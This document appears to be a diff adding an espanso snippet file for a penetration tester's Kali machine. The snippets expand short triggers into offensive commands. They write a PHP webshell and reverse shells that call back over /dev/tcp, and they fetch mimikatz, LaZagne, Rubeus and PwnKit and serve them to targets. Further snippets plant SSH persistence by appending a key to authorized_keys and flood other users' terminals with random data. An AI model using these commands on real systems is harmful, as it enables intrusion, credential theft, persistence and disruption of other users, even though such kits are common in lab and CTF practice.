@@ -1,0 +1,93 @@
+# espanso match file
+
+# For a complete introduction, visit the official docs at: https://espanso.org/docs/
+
+# You can use this file to define the base matches (aka snippets)
+# that will be available in every application when using espanso.
+global_vars:
+  - name: "IP"
+    type: "shell"
+    params:
+      cmd: "ip a | grep -q tun0 && hostname -I | awk '{print $(NF-0)}' || hostname -I | awk '{print $1}'"
+
+  - name: "ssh_key"
+    type: "shell"
+    params:
+      cmd: "cat /home/kali/.ssh/id_rsa.pub"
+
+matches:
+# QOL
+  - trigger: ":ip"
+    replace: "{{IP}}"
+                  
+# SETUP AND NMAP              
+  - trigger: ":setup"                  
+    replace : |          
+      rm -rf ~/net
+      mkdir ~/box
+      mkdir -p net && cd net         
+      echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > webshell.php
+      echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'\"); ?>" > revshell.php
+      echo "bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'" > bashshell.sh
+      cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . &
+      wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh & 
+      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/winPEASany.exe -O winpeas.exe & 
+      wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
+      wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 &
+      wget -q https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip && unzip SharpHound-v1.1.0.zip &
+      wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
+      wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe &
+      wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe &
+      wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit &
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz & 
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &
+      sudo python3 -m http.server 80 &
+      mv ~/box
+
+  - trigger: ":pyserver"
+    replace: "python3 -m http.sever "                                                                           
+
+# ENUMERATION
+  - trigger: ":nmap"
+    replace: sudo nmap -A -v -Pn -oN nmap --min-rate 10000 -p- 
+
+  - trigger: ":ping"
+    replace: for i in {1..254} ;do (ping -c 1 0.0.0.$i | grep "bytes from" &) ;done
+
+# POST
+  - trigger: ":pty"
+    replace: |
+      python3 -c 'import pty; pty.spawn("/bin/bash")' || python2 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || python2.7 -c 'import pty; pty.spawn("/bin/bash")' || python3.6 -c 'import pty; pty.spawn("/bin/bash")' || python3.5 -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null 
+      export TERM=screen
+      stty rows 60
+      stty columns 150
+
+  - trigger: ":tty"
+    replace: |
+      reset
+      stty raw -echo; fg
+      stty rows 60 
+      stty columns 150
+      export TERM=screen
+    
+  - trigger: ":sshpersist"
+    replace: |
+      mkdir -p ~/.ssh
+      echo "{{ssh_key}}" >> ~/.ssh/authorized_keys
+      
+  - trigger: ":wget"
+    replace: wget http://{{IP}}/
+
+# Persist Check
+
+  - trigger: ":suid"
+    replace: find / -perm -u=s -type f 2>/dev/null
+
+# Troll
+
+  - trigger: ":train"
+    replace: sl > /dev/pts/
+    
+  - trigger: ":ptspam"
+    replace: ctty=$(tty | cut -d/ -f4) && while :; do sleep 1; for u in $(ls /dev/pts | grep -Ev "$ctty"); do cat /dev/urandom > /dev/pts/$u & disown; done; done
